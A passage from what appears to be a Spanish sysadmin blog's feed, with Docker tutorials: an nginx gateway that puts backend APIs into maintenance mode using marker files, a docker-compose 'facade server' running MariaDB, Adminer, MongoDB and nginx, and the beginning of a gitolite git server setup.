    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    root /srv/www&lt;span class="p"&gt;;&lt;/span&gt;
    index index.html&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/docker/gw-poc$ cat api/start.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;GREETING&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &amp;gt; /srv/www/index.html
&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/nginx -g &lt;span class="s2"&gt;&amp;quot;daemon off;&amp;quot;&lt;/span&gt;
gerard@aldebaran:~/docker/gw-poc$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos nuestra imagen lista para ser construida.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gw-poc$ dbuild -t api api/
Sending build context to Docker daemon &lt;span class="m"&gt;5&lt;/span&gt;.632 kB
...  
Successfully built c91adbf6534e
gerard@aldebaran:~/docker/gw-poc$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creando un proxy como fachada&lt;/h2&gt;
&lt;p&gt;Esta es la piedra angular de la solución. Vamos a empezar con un &lt;strong&gt;nginx&lt;/strong&gt;, pero la novedad es que cada &lt;em&gt;virtualhost&lt;/em&gt; va a incluir una condición nueva: si existe un fichero con el mismo nombre que el dominio en la carpeta raíz (la misma para todos los dominios vale), devolveremos un error 503 en JSON sin pasar la petición a nuestro &lt;em&gt;backend&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gw-poc$ cat gw/Dockerfile 
FROM alpine:3.5
RUN apk add --no-cache nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stdout /var/log/nginx/access.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stderr /var/log/nginx/error.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /run/nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /srv/www &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /etc/nginx/conf.d/default.conf
COPY nginx.conf /etc/nginx/
COPY conf.d/* /etc/nginx/conf.d/
COPY start.sh /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/start.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/gw-poc$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y también ponemos las configuraciones necesarias para dos APIs de &lt;em&gt;backend&lt;/em&gt;, que nos basta para ver si funciona.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gw-poc$ cat gw/nginx.conf 
worker_processes  &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
events &lt;span class="o"&gt;{&lt;/span&gt;
    worker_connections  &lt;span class="m"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
http &lt;span class="o"&gt;{&lt;/span&gt;
    include mime.types&lt;span class="p"&gt;;&lt;/span&gt;
    default_type application/octet-stream&lt;span class="p"&gt;;&lt;/span&gt;
    sendfile on&lt;span class="p"&gt;;&lt;/span&gt;
    keepalive_timeout &lt;span class="m"&gt;65&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    include conf.d/*&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/docker/gw-poc$ cat gw/conf.d/api1 
server &lt;span class="o"&gt;{&lt;/span&gt;
    server_name api1&lt;span class="p"&gt;;&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    root /srv/www&lt;span class="p"&gt;;&lt;/span&gt;

    location / &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;-f &lt;span class="nv"&gt;$document_root&lt;/span&gt;/&lt;span class="nv"&gt;$host&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="m"&gt;503&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
        proxy_pass http://api1:80&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    error_page &lt;span class="m"&gt;503&lt;/span&gt; @maintenance&lt;span class="p"&gt;;&lt;/span&gt;

    location @maintenance &lt;span class="o"&gt;{&lt;/span&gt;
        default_type application/json&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="m"&gt;503&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;{&amp;quot;message&amp;quot;:&amp;quot;Sorry you! This entity (api1) is in maintenance mode&amp;quot;}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/docker/gw-poc$ cat gw/conf.d/api2 
server &lt;span class="o"&gt;{&lt;/span&gt;
    server_name api2&lt;span class="p"&gt;;&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    root /srv/www&lt;span class="p"&gt;;&lt;/span&gt;

    location / &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;-f &lt;span class="nv"&gt;$document_root&lt;/span&gt;/&lt;span class="nv"&gt;$host&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="m"&gt;503&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
        proxy_pass http://api2:80&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    error_page &lt;span class="m"&gt;503&lt;/span&gt; @maintenance&lt;span class="p"&gt;;&lt;/span&gt;

    location @maintenance &lt;span class="o"&gt;{&lt;/span&gt;
        default_type application/json&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="m"&gt;503&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;{&amp;quot;message&amp;quot;:&amp;quot;Sorry you! This entity (api2) is in maintenance mode&amp;quot;}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/docker/gw-poc$ cat gw/start.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/nginx -g &lt;span class="s2"&gt;&amp;quot;daemon off;&amp;quot;&lt;/span&gt;
gerard@aldebaran:~/docker/gw-poc$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y construimos la imagen.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gw-poc$ dbuild -t gw gw/
Sending build context to Docker daemon &lt;span class="m"&gt;6&lt;/span&gt;.656 kB
...
Successfully built ddf3f294c99c
gerard@aldebaran:~/docker/gw-poc$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Ponemos todo junto&lt;/h2&gt;
&lt;p&gt;El último paso es montar un entorno que nos permita lanzar pruebas y ver que funciona. Para ello, vamos a usar &lt;strong&gt;docker-compose&lt;/strong&gt; por la comodidad que supone.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gw-poc$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  gw:
    image: gw
    container_name: gw
    hostname: gw
    volumes:
      - ./volume:/srv/www
    ports:
      - &lt;span class="s2"&gt;&amp;quot;80:80&amp;quot;&lt;/span&gt;
    depends_on:
      - api1
      - api2
  api1:
    image: api
    container_name: api1
    hostname: api1
    environment:
      GREETING: &lt;span class="s2"&gt;&amp;quot;Hello from api1&amp;quot;&lt;/span&gt;
  api2:
    image: api
    container_name: api2
    hostname: api2
    environment:
      GREETING: &lt;span class="s2"&gt;&amp;quot;Bye from api2&amp;quot;&lt;/span&gt;
gerard@aldebaran:~/docker/gw-poc$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Levantamos el entorno entero con los comandos habituales:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gw-poc$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;gwpoc_default&amp;quot;&lt;/span&gt; with the default driver
Creating api1
Creating api2
Creating gw
gerard@aldebaran:~/docker/gw-poc$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Tras levantar el entorno, podemos hacer algunas peticiones, tanto a los contenedores que sirven la API, como al &lt;em&gt;gateway&lt;/em&gt; que las engloba.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gw-poc$ curl http://172.18.0.2/
Hello from api1
gerard@aldebaran:~/docker/gw-poc$ curl http://172.18.0.3/
Bye from api2
gerard@aldebaran:~/docker/gw-poc$ curl -H &lt;span class="s2"&gt;&amp;quot;Host: api1&amp;quot;&lt;/span&gt; http://localhost/
Hello from api1
gerard@aldebaran:~/docker/gw-poc$ curl -H &lt;span class="s2"&gt;&amp;quot;Host: api2&amp;quot;&lt;/span&gt; http://localhost/
Bye from api2
gerard@aldebaran:~/docker/gw-poc$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y ahora solo nos falta la magia: tiramos un fichero en &lt;em&gt;/srv/www/&lt;/em&gt;, cómodamente mapeados como un &lt;em&gt;host volume&lt;/em&gt; en la carpeta &lt;em&gt;volume/&lt;/em&gt;. Un fichero con el nombre del &lt;em&gt;virtualhost&lt;/em&gt; va a deshabilitar dicho &lt;em&gt;virtualhost&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gw-poc$ touch volume/api2
gerard@aldebaran:~/docker/gw-poc$ curl -H &lt;span class="s2"&gt;&amp;quot;Host: api1&amp;quot;&lt;/span&gt; http://localhost/
Hello from api1
gerard@aldebaran:~/docker/gw-poc$ curl -H &lt;span class="s2"&gt;&amp;quot;Host: api2&amp;quot;&lt;/span&gt; http://localhost/
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;message&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Sorry you! This entity (api2) is in maintenance mode&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
gerard@aldebaran:~/docker/gw-poc$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;De la misma manera, podemos rehabilitarlo quitando ese fichero de ahí.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gw-poc$ rm volume/api2 
gerard@aldebaran:~/docker/gw-poc$ curl -H &lt;span class="s2"&gt;&amp;quot;Host: api1&amp;quot;&lt;/span&gt; http://localhost/
Hello from api1
gerard@aldebaran:~/docker/gw-poc$ curl -H &lt;span class="s2"&gt;&amp;quot;Host: api2&amp;quot;&lt;/span&gt; http://localhost/
Bye from api2
gerard@aldebaran:~/docker/gw-poc$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y lo mismo aplica para el primer dominio, aunque no lo repito por brevedad.&lt;/p&gt;
&lt;h2&gt;Siguientes pasos&lt;/h2&gt;
&lt;p&gt;El hecho de habilitar y deshabilitar las APIs se necesitaba hacer por parte de gente que no tiene necesariamente conocimientos técnicos para acceder al entorno, o no queremos simplemente por seguridad. La solución cómoda es una bonita interfaz web que les permita hacerlo a golpe de click y con una gestión de permisos adecuada ya incorporada.&lt;/p&gt;
&lt;p&gt;Como no queremos inventar la rueda nuevamente, podemos usar algo que ya esté hecho, como por ejemplo un &lt;strong&gt;jenkins&lt;/strong&gt;. De hecho, nada nos impide que el &lt;strong&gt;jenkins&lt;/strong&gt; lance &lt;em&gt;playbooks&lt;/em&gt; de &lt;strong&gt;ansible&lt;/strong&gt;. Sin embargo este ya es otro proyecto y en caso de que os interese, &lt;a href="http://www.linuxsysadmin.ml/2016/09/lanzando-playbooks-de-ansible-desde-jenkins.html"&gt;ya he escrito sobre esto&lt;/a&gt;.&lt;/p&gt;</content><category term="api"></category><category term="gateway"></category><category term="proxy"></category><category term="nginx"></category></entry><entry><title>El concepto del servidor fachada con Docker</title><link href="http://www.linuxsysadmin.ml/2017/07/el-concepto-del-servidor-fachada-con-docker.html" rel="alternate"></link><published>2017-07-03T10:00:00+02:00</published><updated>2017-07-03T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-07-03:/2017/07/el-concepto-del-servidor-fachada-con-docker.html</id><summary type="html">&lt;p&gt;Muchos de nosotros tenemos un servidor en casa o en algún &lt;em&gt;hosting&lt;/em&gt;. Como no tenemos mucho tráfico y cada servidor tiene un coste, acabamos llenándolo con un conjunto de servicios bastante grande. Esto supone un problema para actualizar el sistema operativo, suponiendo que los servicios no se molesten entre sí …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Muchos de nosotros tenemos un servidor en casa o en algún &lt;em&gt;hosting&lt;/em&gt;. Como no tenemos mucho tráfico y cada servidor tiene un coste, acabamos llenándolo con un conjunto de servicios bastante grande. Esto supone un problema para actualizar el sistema operativo, suponiendo que los servicios no se molesten entre sí.&lt;/p&gt;
&lt;p&gt;En estos casos podemos valernos de &lt;strong&gt;docker&lt;/strong&gt; (o de cualquier otro sistema de contenedores) para aislar cada servicio en su propio contenedor y para facilitar su portabilidad hacia un nuevo servidor. Con un poco de habilidad con reglas de &lt;em&gt;networking&lt;/em&gt;, podemos hacer esta transición sin cortes y poco a poco.&lt;/p&gt;
&lt;p&gt;El truco es utilizar el concepto &lt;strong&gt;fachada&lt;/strong&gt;, es decir, nuestro servidor es solo la fachada de cada una de nuestros contenedores. Estos exponen su servicio como un puerto en la máquina &lt;em&gt;host&lt;/em&gt; y así parece que el &lt;em&gt;host&lt;/em&gt; es un único servidor. Este &lt;em&gt;host&lt;/em&gt; también nos puede servir para albergar los &lt;em&gt;host volumes&lt;/em&gt; y para hacer tareas de mantenimiento tales como &lt;em&gt;backups&lt;/em&gt; o &lt;em&gt;logrotate&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Un ejemplo práctico&lt;/h2&gt;
&lt;p&gt;Supongamos que queremos un servidor casero con 3 servicios:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Un servidor &lt;strong&gt;mariadb&lt;/strong&gt; y su interfaz de administración web &lt;strong&gt;adminer&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Un servidor de &lt;strong&gt;mongodb&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Un servidor web &lt;strong&gt;nginx&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;En vez de instalarlo todo en nuestro servidor, vamos a aplicar la técnica antes descrita, de mapear en los puertos oficiales los puertos de los contenedores que ejecutan los servicios. Para simplificar el artículo, vamos a utilizar las imágenes oficiales en &lt;em&gt;DockerHub&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para su fácil lanzamiento, vamos a usar &lt;strong&gt;docker-compose&lt;/strong&gt;, que nos simplifica bastante la línea de comandos, ocultando en el fichero &lt;em&gt;docker-compose.yml&lt;/em&gt; cosas como las variables de entorno, el mapeo de puertos o los volúmenes.&lt;/p&gt;
&lt;h3&gt;MariaDB y Adminer&lt;/h3&gt;
&lt;p&gt;Necesitaremos un &lt;em&gt;docker-compose.yml&lt;/em&gt; para levantar los contenedores de &lt;strong&gt;mariadb&lt;/strong&gt; y &lt;strong&gt;adminer&lt;/strong&gt;. En el caso de &lt;strong&gt;mariadb&lt;/strong&gt;, tiene una parte de datos persistentes, que vamos a dejar como un &lt;em&gt;host volume&lt;/em&gt; local.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/homeserver$ tree mariadb/
mariadb/
├── data
└── docker-compose.yml

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;1&lt;/span&gt; file
gerard@aldebaran:~/docker/homeserver$ cat mariadb/docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  mariadb:
    image: mariadb
    container_name: mariadb
    hostname: mariadb
    volumes:
      - ./data:/var/lib/mysql
    environment:
      MYSQL_ROOT_PASSWORD: root1234
    ports:
      - &lt;span class="s2"&gt;&amp;quot;3306:3306&amp;quot;&lt;/span&gt;
  adminer:
    image: adminer
    container_name: adminer
    hostname: adminer
    ports:
      - &lt;span class="m"&gt;8080&lt;/span&gt;:8080
gerard@aldebaran:~/docker/homeserver$ docker-compose -f mariadb/docker-compose.yml up -d
Creating network &lt;span class="s2"&gt;&amp;quot;mariadb_default&amp;quot;&lt;/span&gt; with the default driver
Creating mariadb
Creating adminer
gerard@aldebaran:~/docker/homeserver$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;MongoDB&lt;/h3&gt;
&lt;p&gt;De forma análoga, vamos a usar un &lt;em&gt;docker-compose.yml&lt;/em&gt;, mapeando el puerto de &lt;strong&gt;mongodb&lt;/strong&gt; y su carpeta de datos en el &lt;em&gt;host&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/homeserver$ tree mongodb/
mongodb/
├── data
└── docker-compose.yml

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;1&lt;/span&gt; file
gerard@aldebaran:~/docker/homeserver$ cat mongodb/docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  mongodb:
    image: mongo
    container_name: mongodb
    hostname: mongodb
    volumes:
      - ./data:/data/db
    ports:
      - &lt;span class="s2"&gt;&amp;quot;27017:27017&amp;quot;&lt;/span&gt;
gerard@aldebaran:~/docker/homeserver$ docker-compose -f mongodb/docker-compose.yml up -d
Creating network &lt;span class="s2"&gt;&amp;quot;mongodb_default&amp;quot;&lt;/span&gt; with the default driver
Creating mongodb
gerard@aldebaran:~/docker/homeserver$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Nginx&lt;/h3&gt;
&lt;p&gt;Y volvemos a repetir el proceso; un &lt;em&gt;docker-compose.yml&lt;/em&gt;, un puerto mapeado, y un &lt;em&gt;host volume&lt;/em&gt; para albergar el contenido web.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/homeserver$ tree nginx/
nginx/
├── www
│   └── index.html
└── docker-compose.yml

&lt;span class="m"&gt;1&lt;/span&gt; directory, &lt;span class="m"&gt;2&lt;/span&gt; files
gerard@aldebaran:~/docker/homeserver$ cat nginx/docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  nginx:
    image: nginx
    container_name: nginx
    hostname: nginx
    volumes:
      - ./www:/usr/share/nginx/html:ro
    ports:
      - &lt;span class="s2"&gt;&amp;quot;80:80&amp;quot;&lt;/span&gt;
gerard@aldebaran:~/docker/homeserver$ docker-compose -f nginx/docker-compose.yml up -d
Creating network &lt;span class="s2"&gt;&amp;quot;nginx_default&amp;quot;&lt;/span&gt; with the default driver
Creating nginx
gerard@aldebaran:~/docker/homeserver$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;El resultado&lt;/h3&gt;
&lt;p&gt;Si miramos los puertos abiertos en nuestro servidor, podemos ver fácilmente que responde los 4 puertos que suministran los servicios antes citados, y nada nos impide seguir creando servicios para ofrecer más puertos en nuestro servidor. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/homeserver$ netstat -lnt
Active Internet connections &lt;span class="o"&gt;(&lt;/span&gt;only servers&lt;span class="o"&gt;)&lt;/span&gt;
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp6       &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; :::27017                :::*                    LISTEN     
tcp6       &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; :::3306                 :::*                    LISTEN     
tcp6       &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; :::80                   :::*                    LISTEN     
tcp6       &lt;span class="m"&gt;0&lt;/span&gt;      &lt;span class="m"&gt;0&lt;/span&gt; :::8080                 :::*                    LISTEN     
gerard@aldebaran:~/docker/homeserver$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En caso de querer actualizar el sistema operativo base, solo tenemos que crear un nuevo servidor y levantar los contenedores de servicio, uno por uno; si usamos algún elemento de red como un &lt;em&gt;firewall&lt;/em&gt;, podemos desviar tráfico sin que se note, hasta que estemos preparados para reemplazar el servidor viejo con el nuevo.&lt;/p&gt;
&lt;p&gt;Al tratarse de contenedores individuales, lo que pase en un contendedor no va a interferir en lo que pase en otro, ganando así el concepto de aislamiento, pudiendo convivir varias versiones de un mismo &lt;em&gt;software&lt;/em&gt; o diversos servicios que ofrezcan el mismo protocolo. solo hay que tener en cuenta que los puertos mapeados en el &lt;em&gt;host&lt;/em&gt; deben ser únicos.&lt;/p&gt;</content><category term="docker"></category><category term="fachada"></category><category term="docker-compose"></category></entry><entry><title>Un servidor de git local con gitolite</title><link href="http://www.linuxsysadmin.ml/2017/06/un-servidor-de-git-local-con-gitolite.html" rel="alternate"></link><published>2017-06-26T10:00:00+02:00</published><updated>2017-06-26T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-06-26:/2017/06/un-servidor-de-git-local-con-gitolite.html</id><summary type="html">&lt;p&gt;A todos nos encanta el sistema de control de versiones &lt;strong&gt;git&lt;/strong&gt;. Tanto a nivel local como a nivel público en &lt;em&gt;GitHub&lt;/em&gt; es una maravilla; lo que no me gusta tanto es el precio que suelen tener las soluciones privadas. Sin embargo, y con un poco de habilidad, podemos encontrar alternativas …&lt;/p&gt;</summary><content type="html">&lt;p&gt;A todos nos encanta el sistema de control de versiones &lt;strong&gt;git&lt;/strong&gt;. Tanto a nivel local como a nivel público en &lt;em&gt;GitHub&lt;/em&gt; es una maravilla; lo que no me gusta tanto es el precio que suelen tener las soluciones privadas. Sin embargo, y con un poco de habilidad, podemos encontrar alternativas.&lt;/p&gt;
&lt;p&gt;Existen varias alternativas tipo web, como por ejemplo &lt;a href="https://github.com/gitlabhq/gitlabhq"&gt;GitLab&lt;/a&gt; (imagen para &lt;strong&gt;docker&lt;/strong&gt; en &lt;a href="https://hub.docker.com/r/gitlab/gitlab-ce/"&gt;DockerHub&lt;/a&gt;); sin embargo, como amante del terminal me decanto por &lt;a href="http://gitolite.com/gitolite/index.html"&gt;Gitolite&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Además de las virtudes propias de &lt;strong&gt;git&lt;/strong&gt;, &lt;strong&gt;gitolite&lt;/strong&gt; nos ofrece un sistema de control de permisos en los repositorios bajo su administración, usando un usuario remoto SSH único y diferenciando quien es el usuario mediante la clave SSH que use para establecer la conexión.&lt;/p&gt;
&lt;p&gt;Otro punto interesante es que el servidor (usuarios, repositorios y permisos) se administra mediante &lt;strong&gt;git&lt;/strong&gt;, existiendo el usuario &lt;em&gt;admin&lt;/em&gt; con permisos sobre el repositorio &lt;em&gt;gitolite-admin&lt;/em&gt;. Este tiene la responsabilidad de clonar el repositorio, añadir los cambios y empujarlos con un &lt;em&gt;git push&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Montando el servidor&lt;/h2&gt;
&lt;p&gt;Como viene siendo tradición, vamos a aislar nuestro servicio de &lt;strong&gt;gitolite&lt;/strong&gt; en un contenedor &lt;strong&gt;docker&lt;/strong&gt;. Para ello vamos a utilizar una base de &lt;em&gt;Alpine Linux&lt;/em&gt; que nos va a dar un conjunto de paquetes bastante actualizados, a un tamaño bastante pequeño.&lt;/p&gt;
&lt;p&gt;Vamos a crear una imagen y le vamos a poner un &lt;em&gt;tag&lt;/em&gt; para diferenciarla del resto, por ejemplo, &lt;em&gt;gitolite&lt;/em&gt;. Aquí os paso el contexto para su construcción:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gitolite$ cat Dockerfile 
FROM alpine:3.5
RUN apk add --no-cache openssh gitolite &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    passwd -u git
COPY start.sh /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/start.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@aldebaran:~/docker/gitolite$ cat start.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key -N &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$SSH_PUBKEY&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &amp;gt; /tmp/admin.pub
su git -c &lt;span class="s2"&gt;&amp;quot;gitolite setup -pk /tmp/admin.pub&amp;quot;&lt;/span&gt;
rm /tmp/admin.pub

&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/sshd -D -e
gerard@aldebaran:~/docker/gitolite$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El &lt;em&gt;script&lt;/em&gt; de inicialización &lt;em&gt;start.sh&lt;/em&gt; va a iniciar el demonio de SSH, no sin antes generar las claves de &lt;em&gt;host&lt;/em&gt; nuevas e inicializar &lt;strong&gt;gitolite&lt;/strong&gt;. Un pequeño detalle interesante es que &lt;strong&gt;gitolite&lt;/strong&gt; exige una clave pública SSH para que el usuario &lt;em&gt;admin&lt;/em&gt; pueda modificar el repositorio de administración; por comodidad la vamos a pasar mediante la variable de entorno &lt;em&gt;SSH_PUBKEY&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La forma más fácil de levantar el servidor es con &lt;strong&gt;docker compose&lt;/strong&gt;, y aunque este varia según vuestros gustos personales, yo he usado algo así:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gitolite$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
services:
  gitolite:
    image: gitolite
    container_name: gitolite
    hostname: gitolite
    environment:
      SSH_PUBKEY: &lt;span class="s2"&gt;&amp;quot;ssh-rsa ...&amp;quot;&lt;/span&gt;
    ports:
      - &lt;span class="s2"&gt;&amp;quot;22:22&amp;quot;&lt;/span&gt;
gerard@aldebaran:~/docker/gitolite$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Para evitar indicar el usuario, la dirección IP y la clave SSH a usar, podemos definir algunos &lt;em&gt;hosts&lt;/em&gt; en el fichero &lt;em&gt;~/.ssh/config&lt;/em&gt;, que también nos va a ser útil en el momento de las operaciones &lt;strong&gt;git&lt;/strong&gt; remotas, que no aceptan parámetros.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ cat .ssh/config 
...
Host gitolite-admin
    Hostname &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1
    User git
    IdentityFile ~/docker/gitolite/keys/admin

Host gitolite-gerard
    Hostname &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1
    User git
